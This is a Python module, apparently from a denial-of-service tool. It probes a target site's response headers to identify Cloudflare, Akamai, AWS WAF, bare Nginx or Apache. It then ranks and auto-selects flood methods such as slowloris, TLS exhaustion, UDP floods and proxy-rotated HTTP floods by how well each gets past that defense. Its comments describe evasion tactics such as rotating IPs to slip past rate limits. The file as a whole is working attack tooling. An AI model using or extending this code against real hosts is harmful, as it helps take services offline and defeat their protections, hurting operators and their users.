"""AI Traffic Analysis — Auto-select best attack method based on target's defense pattern.
Uses heuristic rules (no external ML model needed) to detect firewall/CDN type and recommend method."""
import asyncio
import aiohttp
from datetime import datetime, timezone

# Defense pattern detection rules
DEFENSE_RULES = {
    "cloudflare": {
        "detect": ["server: cloudflare", "cf-ray:", "cf-cache-status:", "__cf_bm"],
        "recommended": ["HTTP_PROXY", "H2RAPID", "WSFLOOD"],
        "reason": "Cloudflare proxy — use IP rotation + L7 methods that pass edge",
    },
    "akamai": {
        "detect": ["server: akamaighost", "akamai", "x-akamai"],
        "recommended": ["HTTP_PROXY", "HTTP", "SLOWLORIS"],
        "reason": "Akamai edge — L7 methods with proxy rotation",
    },
    "aws_waf": {
        "detect": ["x-amz-cf-id", "x-amzn-waf", "awselb"],
        "recommended": ["HTTP_PROXY", "GRAPHQL"],
        "reason": "AWS WAF — GraphQL abuse + proxy rotation bypass rate-limit",
    },
    "nginx_only": {
        "detect": ["server: nginx"],
        "recommended": ["MEGA", "TLS_EXHAUST", "SLOWLORIS"],
        "reason": "Nginx without CDN — TCP connection flood + slowloris effective",
    },
    "apache_only": {
        "detect": ["server: apache"],
        "recommended": ["SLOWLORIS", "MEGA", "HTTP"],
        "reason": "Apache — slowloris kills MaxRequestWorkers, TCP flood exhausts",
    },
    "no_protection": {
        "detect": [],  # fallback if no CDN/WAF detected
        "recommended": ["MEGA", "TLS_EXHAUST", "UDP", "SLOWLORIS"],
        "reason": "No CDN/WAF detected — all methods viable, TCP+UDP most effective",
    },
}

# Method effectiveness score by defense type (0-10)
METHOD_SCORES = {
    "cloudflare": {"MEGA": 3, "TLS_EXHAUST": 3, "HTTP": 4, "SLOWLORIS": 3, "HTTP_PROXY": 8, "GAME": 2, "H2RAPID": 7, "WSFLOOD": 6, "GRAPHQL": 5, "UDP": 1},
    "akamai":     {"MEGA": 3, "TLS_EXHAUST": 3, "HTTP": 5, "SLOWLORIS": 4, "HTTP_PROXY": 7, "GAME": 2, "H2RAPID": 5, "WSFLOOD": 5, "GRAPHQL": 4, "UDP": 1},
    "aws_waf":    {"MEGA": 4, "TLS_EXHAUST": 3, "HTTP": 3, "SLOWLORIS": 3, "HTTP_PROXY": 7, "GAME": 2, "H2RAPID": 6, "WSFLOOD": 5, "GRAPHQL": 8, "UDP": 2},
    "nginx_only": {"MEGA": 9, "TLS_EXHAUST": 8, "HTTP": 7, "SLOWLORIS": 9, "HTTP_PROXY": 5, "GAME": 3, "H2RAPID": 6, "WSFLOOD": 7, "GRAPHQL": 6, "UDP": 8},
    "apache_only":{"MEGA": 8, "TLS_EXHAUST": 7, "HTTP": 6, "SLOWLORIS": 10,"HTTP_PROXY": 4, "GAME": 3, "H2RAPID": 5, "WSFLOOD": 6, "GRAPHQL": 5, "UDP": 7},
    "no_protection":{"MEGA": 9, "TLS_EXHAUST": 8, "HTTP": 7, "SLOWLORIS": 8, "HTTP_PROXY": 5, "GAME": 3, "H2RAPID": 6, "WSFLOOD": 7, "GRAPHQL": 6, "UDP": 10},
}


async def detect_defense(target_host: str, target_port: int = 443) -> dict:
    """Probe target to detect firewall/CDN type. Returns defense info."""
    defense_type = "no_protection"
    detected_headers = []
    response_time_ms = 0

    try:
        scheme = "https" if target_port in (443, 8443) else "http"
        url = f"{scheme}://{target_host}/"
        timeout = aiohttp.ClientTimeout(total=10)
        start = datetime.now(timezone.utc)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, ssl=False, allow_redirects=False) as r:
                response_time_ms = int((datetime.now(timezone.utc) - start).total_seconds() * 1000)
                headers = {k.lower(): v.lower() for k, v in r.headers.items()}
                detected_headers = list(headers.keys())

                # Check each defense pattern
                server = headers.get("server", "")
                all_header_text = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()

                for dtype, rules in DEFENSE_RULES.items():
                    if dtype == "no_protection":
                        continue
                    for pattern in rules["detect"]:
                        if pattern in all_header_text:
                            defense_type = dtype
                            break
                    if defense_type != "no_protection":
                        break

    except Exception as e:
        # If we can't connect, target might be down or very restricted
        defense_type = "no_protection"
        response_time_ms = -1

    return {
        "defense_type": defense_type,
        "detected_headers": detected_headers[:10],
        "response_time_ms": response_time_ms,
        "recommended_methods": DEFENSE_RULES[defense_type]["recommended"],
        "reason": DEFENSE_RULES[defense_type]["reason"],
    }


def get_method_scores(defense_type: str) -> dict:
    """Return effectiveness scores for each method against detected defense."""
    return METHOD_SCORES.get(defense_type, METHOD_SCORES["no_protection"])


def auto_select_method(defense_type: str, available_methods: list) -> str:
    """Auto-select best method from available based on defense pattern."""
    scores = get_method_scores(defense_type)
    best = None
    best_score = -1
    for m in available_methods:
        s = scores.get(m.upper(), 0)
        if s > best_score:
            best = m
            best_score = s
    return best or "MEGA"
